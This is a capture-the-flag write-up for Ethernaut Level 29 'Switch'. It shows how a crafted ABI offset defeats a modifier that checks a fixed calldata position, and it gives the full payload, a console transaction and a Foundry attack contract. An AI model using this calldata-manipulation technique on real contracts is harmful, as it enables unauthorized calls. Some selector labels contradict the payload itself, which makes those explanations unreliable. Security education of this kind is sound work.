<div align="center">
<p align="left">(<a href="https://github.com/Pedrojok01/Ethernaut-Solutions?tab=readme-ov-file#solutions">back</a>)</p>

<img src="../assets/levels/29-switch.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 29 - Switch</strong></h1>

</div>
<br>

Read the article directly on my blog: [Ethernaut Solutions | Level 29 - Switch](https://blog.pedrojok.com/the-ethernaut-ctf-solutions-29-switch)

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Goals](#goals)
- [The hack](#the-hack)
  - [Calldata encoding](#calldata-encoding)
  - [Custom calldata](#custom-calldata)
- [Solution](#solution)
  - [In the browser's console:](#in-the-browsers-console)
  - [In Foundry using `forge`:](#in-foundry-using-forge)
- [Takeaway](#takeaway)
- [Reference](#reference)

## Goals

<img src="../assets/requirements/29-switch-requirements.webp" width="800px"/>

## The hack

Just have to flip the switch... And we even have a turnSwitchOn() function to do just that. However, this function is protected by the `onlyThis` modifier:

```javascript
modifier onlyThis() {
    require(msg.sender == address(this), "Only the contract can call this");
    _;
}
```

So only the `Switch` contract can call it. So let's take a look at the `flipSwitch()` function, after all, with such a name, it might just work!

```javascript
function flipSwitch(bytes memory _data) public onlyOff {
    (bool success, ) = address(this).call(_data);
    require(success, "call failed :(");
}
```

This function does an external call on itself, it seems too good to be true. We could simply pass the `turnSwitchOn()` function selector... But let's take a look at the `onlyOff` modifier, in case:

```javascript
modifier onlyOff() {
    // we use a complex data type to put in memory
    bytes32[1] memory selector;
    // check that the calldata at position 68 (location of _data)
    assembly {
        calldatacopy(selector, 68, 4) // grab function selector from calldata
    }
    require(
        selector[0] == offSelector,
        "Can only call the turnOffSwitch function"
    );
    _;
}
```

Obviously enough, the goal of this modifier is to make sure we CAN ONLY pass the `turnSwitchOff()` function selector to the `flipSwitch()` function! So we will need to craft some custom calldata to pass the `turnSwitchOn()` function selector while making sure the `turnSwitchOff()` selector is positioned at the 68th byte of the calldata.

So how to do that?

### Calldata encoding

We know that each solidity types are stored in its hex form, padded with zeros to fill a 32-byte slot. For instance:

> uint256 `20` is `0x14` in hex, and would be stored like this:
> `0x0000000000000000000000000000000000000000000000000000000000000014`

For dynamic types, it is a bit different and solidity stores them as follows:

- first 32-byte is the offset of the data;
- next 32-byte is the length of the data;
- next are the data themselves.

Let's take the following array: `uint256[] memory data = [2, 3, 5, 7, 11]`. It would be stored as follows:

```java
offset:
0000000000000000000000000000000000000000000000000000000000000020

length (5 elements in the array):
0000000000000000000000000000000000000000000000000000000000000005

first element value(2):
0000000000000000000000000000000000000000000000000000000000000002

second element value(3):
0000000000000000000000000000000000000000000000000000000000000003

third element value(5):
0000000000000000000000000000000000000000000000000000000000000005

fourth element value(7):
0000000000000000000000000000000000000000000000000000000000000007

fifth element value(11):
000000000000000000000000000000000000000000000000000000000000000B
```

And the output would be:

> 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000007000000000000000000000000000000000000000000000000000000000000000B

So let's craft the calldata for the `flipSwitch()` function.

### Custom calldata

We will need the `turnSwitchOn()` and `turnSwitchOff()` function selectors:

```bash
cast sig "turnSwitchOn()"
=> 0x30c13ade

cast sig "turnSwitchOff()"
=> 0x20606e15
```

Now, why is the `onlyOff` modifier targetting the position 68?

- The first 4 bytes are the function selector;
- The next 64 bytes are the offset and the length of the data;

So the data, which is the function selector, starts at the 68th byte. What if we play with the offset and tell the function that the data starts at position 96 instead?

```java
function selector turnSwitchOn:
30c13ade

offset: (96-byte instead of 68-byte)
0000000000000000000000000000000000000000000000000000000000000060

extra blank 32-byte:
0000000000000000000000000000000000000000000000000000000000000000

function selector turnSwitchOff at position 68:
20606e1500000000000000000000000000000000000000000000000000000000

data length (4-byte):
0000000000000000000000000000000000000000000000000000000000000004

data containing the function selector that will be called:
76227e1200000000000000000000000000000000000000000000000000000000
```

And here is the output:

> 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

The `turnSwitchOn()` function selector is positioned at position 68, however, it is not relevant anymore as we are telling the function that the data starts at position 96 instead!
We can finally call the `flipSwitch()` function to toggle the switch on!

## Solution

### In the browser's console:

```javascript
await sendTransaction({
  from: player,
  to: instance,
  data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000",
});
```

### In Foundry using `forge`:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Switcher {
    address private immutable switchContract;
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    constructor(address _switchContract) {
        switchContract = _switchContract;
    }

    function toogle() public {
        bytes
            memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (bool success, ) = switchContract.call(data);
        require(success, "Toogle failed!");
    }
}
```

The command to run the script:

```bash
forge script script/29_Switch.s.sol:PoC --rpc-url sepolia --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY --watch
```

## Takeaway

- Calldata encoding is a crucial part of the Ethereum Virtual Machine (EVM).
- Assuming positions in CALLDATA with dynamic types can be erroneous, especially when using hard-coded CALLDATA positions.

## Reference

- Transaction Calldata Demystified: https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
